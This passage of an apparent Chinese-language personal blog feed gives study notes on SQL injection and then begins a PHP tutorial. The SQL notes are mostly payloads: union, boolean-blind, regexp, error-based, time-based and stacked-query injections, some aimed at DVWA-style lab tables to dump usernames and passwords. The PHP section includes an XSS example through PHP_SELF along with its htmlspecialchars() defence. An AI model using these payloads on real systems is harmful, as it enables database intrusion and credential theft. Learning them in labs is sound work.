class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(username,password) from users&#x2F;&#x2F;假设已经获取到表名为user，且字段为username和password</span><br></pre></td></tr></table></figure><h2 id="常用注入方式"><a href="#常用注入方式" class="headerlink" title="常用注入方式"></a>常用注入方式</h2><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union的作用是将两个sql语句进行联合。当注入参数的数据在数据库中不存在时，两个sql语句进行联合操作时，前一个语句选择的内容为空时，后面语句的查询内容就显示出来。如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D;-1 union select 1,2,3 </span><br></pre></td></tr></table></figure><h3 id="布尔注入-构造逻辑判断"><a href="#布尔注入-构造逻辑判断" class="headerlink" title="布尔注入(构造逻辑判断)"></a>布尔注入(构造逻辑判断)</h3><p>boolean 根据注入信息返回true or fales,无任何报错</p><p><strong>相关函数</strong></p><p><strong>length(str)</strong> ：返回字符串str的长度</p><p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p><strong>mid(str,pos,len)</strong> ：跟substr一样，截取字符串</p><p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p><p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#39; and length (database())&#x3D;x(某个值，用大于或者小于某个值也可以)--+&#x2F;&#x2F;猜数据库名长度：(猜对时页面才会显示正常)</span><br><span class="line"></span><br><span class="line">&#39; and length((select schema_name from information_schema.schemata limit 0,1))&#x3D;18 --+ &#x2F;&#x2F;查询所有数据库的长度</span><br><span class="line"></span><br><span class="line">&#39; and left(database(),1)&#x3D;&#39;s&#39;--+ &#x2F;&#x2F;猜数据库的名字 </span><br><span class="line"></span><br><span class="line">&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &#x3D; 101--+&#x2F;&#x2F;获取数据库下的表</span><br><span class="line"></span><br><span class="line">&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 0,1))&#x3D;9 --+ 查询表的长度</span><br><span class="line"></span><br><span class="line">&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1)--+&#x2F;&#x2F;获取表里的列名</span><br><span class="line"></span><br><span class="line">&#39; and length((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;users&quot;limit 0,1))&gt;1 --+ &#x2F;&#x2F;查询列的长度</span><br><span class="line"></span><br><span class="line">&#39; and ord(mid((select ifnull(cast(username as char),x（错误返回值）)from security.users order by id limit 0,1),1,1))&#x3D;68--+ &#x2F;&#x2F;获取列的内容</span><br></pre></td></tr></table></figure><h4 id="regexp正则注入"><a href="#regexp正则注入" class="headerlink" title="regexp正则注入"></a>regexp正则注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#39; and 1&#x3D;(user() regexpri&#39;^&#39;) --+&#x2F;&#x2F;查看当前操作的用户</span><br><span class="line"> </span><br><span class="line">&#39; and 1&#x3D;(database() regexp&#39;^s&#39;) --+&#x2F;&#x2F;查看当前数据库</span><br><span class="line"></span><br><span class="line">&#39; and ((select schema_name from information_schema.schemata limit 0,1) regexp&#39;^i[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测第一个数据库的名字</span><br><span class="line"> </span><br><span class="line">&#39; and ((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 0,1)regexp &#39;^g[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里第一个表的名字</span><br><span class="line"> </span><br><span class="line">&#39; and ((select column_name from information_schema.columns where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39; limit 0,1) regexp &#39;^u[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里的users表里的第一个值</span><br><span class="line"> </span><br><span class="line">&#39; and ((select user from dvwa.users limit 0,1) regexp &#39;^a[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里的users表里的user字段里的第一个值</span><br></pre></td></tr></table></figure><h4 id="like匹配注入"><a href="#like匹配注入" class="headerlink" title="like匹配注入"></a>like匹配注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() like &#39;ro%&#39;</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a>floor()和rand()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a   &#x2F;&#x2F;利用错误信息得到当前数据库名</span><br></pre></td></tr></table></figure><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure><h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5)) --+&#x2F;&#x2F;如果前面执行的正确执行0就为假 ,如果前面错误则执行后面sleep(5)延迟5秒</span><br></pre></td></tr></table></figure><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1&#39;;select if(sub(user(),1,1)&#x3D;&#39;r&#39;,sleep(3),1)%23</span><br></pre></td></tr></table></figure><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><img src="/2020/11/08/SQL/%E5%95%A6%E5%95%A6%E5%95%A6.jpg" alt="啦啦啦"></p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><img src="/2020/11/08/SQL/%E5%93%88%E5%93%88%E5%93%88.jpg" alt="哈哈哈"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php(三)</title>
    <link href="/2020/11/04/php(%E4%B8%89)/"/>
    <url>/2020/11/04/php(%E4%B8%89)/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP（三）"><a href="#PHP（三）" class="headerlink" title="PHP（三）"></a>PHP（三）</h1><ul><li><a href="#php%E4%B8%89">PHP（三）</a><ul><li><a href="#php-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4">PHP 命名空间</a><ul><li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li></ul></li><li><a href="#php%E8%A1%A8%E5%8D%95">php表单</a><ul><li><a href="#php-%E4%B8%8B%E6%8B%89%E8%8F%9C%E5%8D%95%E5%8D%95%E9%80%89">PHP 下拉菜单单选</a></li><li><a href="#php-%E4%B8%8B%E6%8B%89%E8%8F%9C%E5%8D%95%E5%A4%9A%E9%80%89">PHP 下拉菜单多选</a></li></ul></li><li><a href="#php-%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81">PHP 表单验证</a><ul><li><a href="#php-%E9%AA%8C%E8%AF%81%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE">PHP 验证表单数据</a></li><li><a href="#php-%E8%A1%A8%E5%8D%95---%E5%BF%85%E9%9C%80%E5%AD%97%E6%AE%B5">PHP 表单 - 必需字段</a></li></ul></li><li><a href="#%E9%AA%8C%E8%AF%81%E9%82%AE%E4%BB%B6%E5%92%8Curl">验证邮件和URL</a><ul><li><a href="#php---%E9%AA%8C%E8%AF%81%E5%90%8D%E7%A7%B0">PHP - 验证名称</a></li></ul></li><li><a href="#php-%E5%A4%9A%E7%BB%B4%E6%95%B0%E7%BB%84">PHP 多维数组</a></li><li><a href="#date-%E5%87%BD%E6%95%B0">date() 函数</a></li><li><a href="#php-%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6">PHP 包含文件</a><ul><li><a href="#include-%E5%92%8C-require-%E8%AF%AD%E5%8F%A5">include 和 require 语句:</a></li></ul></li><li><a href="#php-%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">PHP 文件处理</a><ul><li><a href="#%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6">打开文件</a></li><li><a href="#feof-%E5%87%BD%E6%95%B0">feof() 函数</a></li></ul></li><li><a href="#php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">PHP文件上传</a><ul><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95">创建一个文件上传表单</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC">创建上传脚本</a></li></ul></li><li><a href="#php-cookie">PHP Cookie</a></li><li><a href="#php-session">PHP Session</a></li><li><a href="#php-%E5%8F%91%E9%80%81%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6">PHP 发送电子邮件</a><ul><li><a href="#php-mail-%E5%87%BD%E6%95%B0">PHP mail() 函数</a></li><li><a href="#php-e-mail-%E6%B3%A8%E5%85%A5">PHP E-mail 注入</a></li></ul></li><li><a href="#php-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">PHP 错误处理</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-die-%E5%87%BD%E6%95%B0">使用 die() 函数</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E5%99%A8">创建自定义错误处理器</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F">设置错误处理程序</a></li><li><a href="#%E8%A7%A6%E5%8F%91%E9%94%99%E8%AF%AF-trigger_error">触发错误： trigger_error()</a></li><li><a href="#%E9%94%99%E8%AF%AF%E8%AE%B0%E5%BD%95">错误记录</a></li></ul></li><li><a href="#php-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">PHP 异常处理</a><ul><li><a href="#trythrow-%E5%92%8C-catch">Try、throw 和 catch</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84-exception-%E7%B1%BB%E7%BB%A7%E6%89%BF%E4%BA%86-php-%E7%9A%84-exception-%E7%B1%BB%E7%9A%84%E6%89%80%E6%9C%89%E5%B1%9E%E6%80%A7%E5%8F%AF%E5%90%91%E5%85%B6%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E5%87%BD%E6%95%B0">创建一个自定义的 Exception 类（继承了 PHP 的 exception 类的所有属性，可向其添加自定义的函数）</a></li></ul></li><li><a href="#php-%E8%BF%87%E6%BB%A4%E5%99%A8">PHP 过滤器</a><ul><li><a href="#%E9%AA%8C%E8%AF%81%E8%BE%93%E5%85%A5">验证输入</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E5%A4%9A%E4%B8%AA%E8%BE%93%E5%85%A5filter_var_array-%E6%88%96-the-filter_input_array">过滤多个输入：filter_var_array 或 the filter_input_array</a></li><li><a href="#filter-callback">Filter Callback</a></li></ul></li><li><a href="#php-json">PHP JSON</a><ul><li><a href="#json_encode%E7%94%A8%E4%BA%8E%E5%AF%B9%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C-json-%E7%BC%96%E7%A0%81">json_encode：用于对变量进行 JSON 编码</a></li><li><a href="#%E5%B0%86-php-%E5%AF%B9%E8%B1%A1%E8%BD%AC%E6%8D%A2%E4%B8%BA-json-%E6%A0%BC%E5%BC%8F%E6%95%B0%E6%8D%AE">将 PHP 对象转换为 JSON 格式数据</a></li><li><a href="#json_decode">json_decode</a></li></ul></li></ul></li></ul><h2 id="PHP-命名空间"><a href="#PHP-命名空间" class="headerlink" title="PHP 命名空间"></a>PHP 命名空间</h2><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">&#x2F;&#x2F; 定义代码在 &#39;MyProject&#39; 命名空间中  </span><br><span class="line">namespace MyProject;  </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; ... 代码 ...  </span><br></pre></td></tr></table></figure><p>可以在同一个文件中定义不同的命名空间代码。全局代码必须用一个不带名称的 namespace 语句加上大括号括起来。 declare 是唯一可以放在命名空间前的语句。所有非 PHP 代码包括空白符都不能出现在命名空间的声明之前。</p><h2 id="php表单"><a href="#php表单" class="headerlink" title="php表单"></a>php表单</h2><h4 id="PHP-下拉菜单单选"><a href="#PHP-下拉菜单单选" class="headerlink" title="PHP 下拉菜单单选"></a>PHP 下拉菜单单选</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$q &#x3D; isset($_GET[&#39;q&#39;])? htmlspecialchars($_GET[&#39;q&#39;]) : &#39;&#39;;</span><br><span class="line">if($q) &#123;</span><br><span class="line">        if($q &#x3D;&#x3D;&#39;JD&#39;) &#123;</span><br><span class="line">                echo &#39;京东&lt;br&gt;http:&#x2F;&#x2F;www.JD.com&#39;;</span><br><span class="line">        &#125; else if($q &#x3D;&#x3D;&#39;baidu&#39;) &#123;</span><br><span class="line">                echo &#39; 百度&lt;br&gt;http:&#x2F;&#x2F;www.baidu.com&#39;;</span><br><span class="line">        &#125; else if($q &#x3D;&#x3D;&#39;TAOBAO&#39;) &#123;</span><br><span class="line">                echo &#39;淘宝&lt;br&gt;http:&#x2F;&#x2F;www.taobao.com&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt; </span><br><span class="line">    &lt;select name&#x3D;&quot;q&quot;&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;&quot;&gt;选择一个站点:&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;JD&quot;&gt;JD&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;baidu&quot;&gt;baidu&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;TAOBAO&quot;&gt;Taobao&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;&#x2F;select&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP-下拉菜单多选"><a href="#PHP-下拉菜单多选" class="headerlink" title="PHP 下拉菜单多选"></a>PHP 下拉菜单多选</h4><p>设置 select <strong>name=”q[]”</strong> 以数组的方式获取。</p><p>采用数组arry()函数，其余代码与单选类似：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$q &#x3D; isset($_POST[&#39;q&#39;])? $_POST[&#39;q&#39;] : &#39;&#39;;</span><br><span class="line">if(is_array($q)) &#123;</span><br><span class="line">    $sites &#x3D; array(</span><br><span class="line">            &#39;JD&#39; &#x3D;&gt; &#39;京东: http:&#x2F;&#x2F;www.JD.com&#39;,</span><br><span class="line">            &#39;baidu&#39; &#x3D;&gt; &#39; 百度: http:&#x2F;&#x2F;www.baidu.com&#39;,</span><br><span class="line">            &#39;TAOBAO&#39; &#x3D;&gt; &#39;淘宝: http:&#x2F;&#x2F;www.taobao.com&#39;,</span><br><span class="line">    );</span><br><span class="line">    foreach($q as $val) &#123;</span><br><span class="line">        echo $sites[$val] . PHP_EOL;</span><br></pre></td></tr></table></figure><p>其中PHP_EOL表示换行。</p><h2 id="PHP-表单验证"><a href="#PHP-表单验证" class="headerlink" title="PHP 表单验证"></a>PHP 表单验证</h2><p>$_SERVER[“PHP_SELF”]是超级全局变量，返回当前正在执行脚本的文件名，与 document root相关。<strong>当黑客使用跨网站脚本的HTTP链接来攻击时，该函数服务器变量也会被植入脚本。原因就是跨网站脚本是附在执行文件的路径后面的，因此函数的字符串就会包含HTTP链接后面的JavaScript程序代码。</strong>(XSS又叫 CSS (Cross-Site Script) ,跨站脚本攻击。恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。)</p><p>$_SERVER[“PHP_SELF”] 可以通过 <strong><em>htmlspecialchars()</em></strong> 函数来避免被利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号） 成为 &amp;</span><br><span class="line">&quot; （双引号） 成为 &quot;</span><br><span class="line">&#39; （单引号） 成为 &amp;#039;</span><br><span class="line">&lt; （小于） 成为 &lt;</span><br><span class="line">&gt; （大于） 成为 &gt;</span><br></pre></td></tr></table></figure><p>正常代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;]);?&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>htmlspecialchars() 把一些预定义的字符转换为 HTML 实体。可避免该函数被利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;test_form.php&#x2F;&quot;&gt;&lt;script&gt;alert(&#39;hacked&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP-验证表单数据"><a href="#PHP-验证表单数据" class="headerlink" title="PHP 验证表单数据"></a>PHP 验证表单数据</h4><p>用户提交的数据通过 PHP 的 htmlspecialchars() 函数处理，代码将不会被执行，而会被保存为HTML转义代码。</p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href(&#39;http:&#x2F;&#x2F;www.JD.com&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>处理后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href(&#39;http:&#x2F;&#x2F;www.JD.com&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP-表单-必需字段"><a href="#PHP-表单-必需字段" class="headerlink" title="PHP 表单 - 必需字段"></a>PHP 表单 - 必需字段</h4><p>$nameErr, $emailErr, $genderErr, 和 $websiteErr.这些错误变量显示在必需字段上，在每个$_POST变量中增加了一个if else语句以检查 变量是 否为空（使用empty() 函数）如果为空，将显示对应的错误信息；如果不为空，数据将传递给test_input() 函数。</p><h2 id="验证邮件和URL"><a href="#验证邮件和URL" class="headerlink" title="验证邮件和URL"></a>验证邮件和URL</h2><p><strong>int preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] )</strong></p><p>在 subject 字符串中搜索与 pattern 给出的正则表达式相匹配的内容。如果提供了 matches ，则其会被搜索的结果所填充。$matches[0] 将包含与整个模式匹配的文本，$matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推。</p><h4 id="PHP-验证名称"><a href="#PHP-验证名称" class="headerlink" title="PHP - 验证名称"></a>PHP - 验证名称</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$name &#x3D; test_input($_POST[&quot;name&quot;]);</span><br><span class="line">if (!preg_match(&quot;&#x2F;^[a-zA-Z ]*$&#x2F;&quot;,$name)) &#123;</span><br><span class="line">  $nameErr &#x3D; &quot;只允许字母和空格&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>URL,E-mail,与上面类似；将preg_match括号中替换成<code>(&quot;/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i&quot;,$website),(&quot;/([\w\-]+\@[\w\-]+\.[\w\-]+)/&quot;,$email)</code>即可。</p><h2 id="PHP-多维数组"><a href="#PHP-多维数组" class="headerlink" title="PHP 多维数组"></a>PHP 多维数组</h2><p>包含一个或多个数组的数组，在多维数组中，主数组中的每一个元素也可以是一个数组，子数组中的每一个元素也可以是一个数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 二维数组:</span><br><span class="line">$cosmetic &#x3D; array</span><br><span class="line">(</span><br><span class="line">    array(&quot;YSL&quot;,&quot;Dior&quot;,&quot;CHANEL&quot;),</span><br><span class="line">    array(&quot;GUCCI&quot;,&quot;Lancome&quot;,&quot;Guerlain&quot;),</span><br><span class="line">    array(&quot;HERMES&quot;,&quot;La_Mer&quot;,&quot;DAVIDOFF&quot;)</span><br><span class="line">);</span><br><span class="line">print_r($cosmetic);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt; YSL</span><br><span class="line">            [1] &#x3D;&gt; Dior</span><br><span class="line">            [2] &#x3D;&gt; CHANEL</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [1] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt; GUCCI</span><br><span class="line">            [1] &#x3D;&gt; Lancome</span><br><span class="line">            [2] &#x3D;&gt; Guerlain</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [2] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] &#x3D;&gt; HERMES</span><br><span class="line">            [1] &#x3D;&gt; La_Mer</span><br><span class="line">            [2] &#x3D;&gt; DAVIDOFF</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="date-函数"><a href="#date-函数" class="headerlink" title="date() 函数"></a>date() 函数</h2><p>把时间戳（字符序列，表示一定的事件发生的日期/时间）格式化为可读性更好的日期和时间。</p><p>语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string date ( string $format [, int $timestamp ] )</span><br></pre></td></tr></table></figure><ul><li>d - 代表月中的天 </li><li>m - 代表月 </li><li>Y - 代表年 </li></ul><p>格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo date(&quot;Y&#x2F;m&#x2F;d&quot;) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo date(&quot;Y.m.d&quot;) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo date(&quot;Y-m-d&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2020&#x2F;10&#x2F;19</span><br><span class="line">2020.10.19</span><br><span class="line">2020-10-19</span><br></pre></td></tr></table></figure><p>完整的 PHP Date 参考手册可访问菜鸟教程<a href="https://www.runoob.com/php/php-ref-date.html">https://www.runoob.com/php/php-ref-date.html</a></p><h2 id="PHP-包含文件"><a href="#PHP-包含文件" class="headerlink" title="PHP 包含文件"></a>PHP 包含文件</h2><h4 